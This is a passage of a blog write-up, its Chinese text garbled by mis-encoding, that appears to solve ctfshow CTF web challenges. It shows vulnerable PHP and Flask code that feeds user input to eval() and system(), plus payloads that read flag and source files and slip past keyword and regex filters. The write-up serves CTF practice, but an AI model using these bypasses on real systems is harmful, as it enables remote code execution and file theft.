class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h2><p>é¢˜ç›®</p><h2 id="web424-ssti"><a href="#web424-ssti" class="headerlink" title="web424(ssti)"></a>web424(ssti)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230405212426830.png" alt="image-20230405212426830"></p><p>æŸ¥çœ‹æ³¨é‡Šå‘ç°ç»™äº†ä¸€ä¸ªå‚æ•°å¯ä»¥è¿›è¡Œä¼ å€¼</p><p><img src="../images/image-20230405212500712.png" alt="image-20230405212500712"></p><p><strong>æºç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæ²¡æœ‰osæ¨¡å—äº†ï¼Œé‚£ä¹ˆç›´æ¥å°±ç”¨openæ¥æ‹¿åˆ°flag</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag).read()</span></span><br></pre></td></tr></table></figure><p>è‡ªå·±å¯¼å…¥æœ‰ä¸ªosæ¨¡å—ä¹Ÿè¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat app.py&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web425-è¿‡æ»¤äº†os"><a href="#web425-è¿‡æ»¤äº†os" class="headerlink" title="web425(è¿‡æ»¤äº†os)"></a>web425(è¿‡æ»¤äº†os)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230405213333700.png" alt="image-20230405213333700"></p><p>è¿˜æ˜¯ä¸€æ ·</p><p>ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230405213451936.png" alt="image-20230405213451936"></p><p>ä½¿ç”¨è¿™ä¸ª<strong>open</strong>çš„å‰ææ˜¯å¾—çŸ¥é“æ–‡ä»¶å     <strong>è¿™ä¸ªä¸èƒ½ä½¿ç”¨é€šé…ç¬¦</strong></p><h2 id="web426-è¿‡æ»¤äº†os-popen"><a href="#web426-è¿‡æ»¤äº†os-popen" class="headerlink" title="web426(è¿‡æ»¤äº†os|popen)"></a>web426(è¿‡æ»¤äº†os|popen)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230405213734721.png" alt="image-20230405213734721"></p><p>è¿˜æ˜¯ä¸å½±å“</p><p><strong>ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web427-è¿‡æ»¤äº†os-popen-system"><a href="#web427-è¿‡æ»¤äº†os-popen-system" class="headerlink" title="web427(è¿‡æ»¤äº†os|popen|system)"></a>web427(è¿‡æ»¤äº†os|popen|system)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230405213949469.png" alt="image-20230405213949469"></p><p><strong>ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web428-è¿‡æ»¤os-popen-system-read"><a href="#web428-è¿‡æ»¤os-popen-system-read" class="headerlink" title="web428(è¿‡æ»¤os|popen|system|read)"></a>web428(è¿‡æ»¤os|popen|system|read)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230405214151770.png" alt="image-20230405214151770"></p><p><strong>ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œæ˜¯åªåŒ¹é…å¼€å¤´</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web429-ssti-è¿‡æ»¤äº†os-open-system-read"><a href="#web429-ssti-è¿‡æ»¤äº†os-open-system-read" class="headerlink" title="web429(ssti è¿‡æ»¤äº†os|open|system|read)"></a>web429(ssti è¿‡æ»¤äº†os|open|system|read)</h2><p>é¢˜ç›®<img src="../images/image-20230405214409832.png" alt="image-20230405214409832"></p><p><strong>ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒ¹é…æ˜¯åªåŒ¹é…äº†å¼€å¤´ï¼Œ<strong>æ‰€ä»¥åªéœ€è¦åœ¨payloadå‰é¢åŠ ä¸ªç©ºæ ¼å°±å¥½äº†</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web430-ssti-è¿‡æ»¤äº†os-open-system-read-eval"><a href="#web430-ssti-è¿‡æ»¤äº†os-open-system-read-eval" class="headerlink" title="web430(ssti è¿‡æ»¤äº†os|open|system|read|eval)"></a>web430(ssti è¿‡æ»¤äº†os|open|system|read|eval)</h2><p><strong>åŒ web429çš„åšæ³•</strong></p><p>ä¹Ÿæ˜¯åªåŒ¹é…å¼€å¤´</p><h2 id="web-431-ssti-è¿‡æ»¤äº†è¿‡æ»¤äº†os-open-system-read-eval-str"><a href="#web-431-ssti-è¿‡æ»¤äº†è¿‡æ»¤äº†os-open-system-read-eval-str" class="headerlink" title="web 431 ssti è¿‡æ»¤äº†è¿‡æ»¤äº†os|open|system|read|eval|str"></a>web 431 ssti è¿‡æ»¤äº†è¿‡æ»¤äº†os|open|system|read|eval|str</h2><p><strong>åŒweb430</strong></p><p><strong>åé¢å°±æ˜¯æ­£å¸¸çš„è¿‡æ»¤äº†ï¼Œå› ä¸ºè¿‡æ»¤äº†evalæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨execæ¥æ‰§è¡Œäº†.ä½†æ˜¯execçš„è¿”å›å€¼æ°¸è¿œæ˜¯noneï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸€äº›ç›²æ‰“çš„æ–¹æ³•äº†ã€‚</strong></p><h2 id="web432-è¿‡æ»¤os-open-system-read-eval-web449éƒ½æ˜¯sstiçš„é¢˜ç›®"><a href="#web432-è¿‡æ»¤os-open-system-read-eval-web449éƒ½æ˜¯sstiçš„é¢˜ç›®" class="headerlink" title="web432(è¿‡æ»¤os|open|system|read|eval)-web449éƒ½æ˜¯sstiçš„é¢˜ç›®"></a>web432(è¿‡æ»¤os|open|system|read|eval)-web449éƒ½æ˜¯sstiçš„é¢˜ç›®</h2><p>è¿™é‡Œå°±ä¸åšäº†</p><h2 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯på’Œpå¼‚æˆ–ï¼Œä¾æ¬¡æ¥å¼‚æˆ–</p><p><strong>å¼‚æˆ– </strong>     â€”â€”-&gt;    ç›¸åŒä¸ºé›¶   ä¸åŒä¸º1 </p><p>æ‹¿<code>p^p^p</code>æ¥ä¸¾ä¸ªä¾‹å­     å…ˆæ˜¯ <code>p^p</code>  â€”-&gt;  0      ç„¶å <code>0^p</code>  â€”â€”â€”-&gt;   p</p><p>å°±æ˜¯è¿™æ ·äº†</p><h2 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpanfo^phpznfo^phprnfo</span><br></pre></td></tr></table></figure><p><strong>è¿™é‡Œçš„å¼‚æˆ–æ˜¯è½¬åŒ–ä¸ºasciiç æ¥è¿›è¡Œè®¡ç®—çš„</strong></p><h2 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="keyword">echo</span> `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h2><p><strong>é¢˜ç›®</strong></p><p><img src="../images/image-20230405221320480.png" alt="image-20230405221320480"></p><p>å…ˆå»è¯»å–ä¸€ä¸‹æºç </p><p><strong>æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 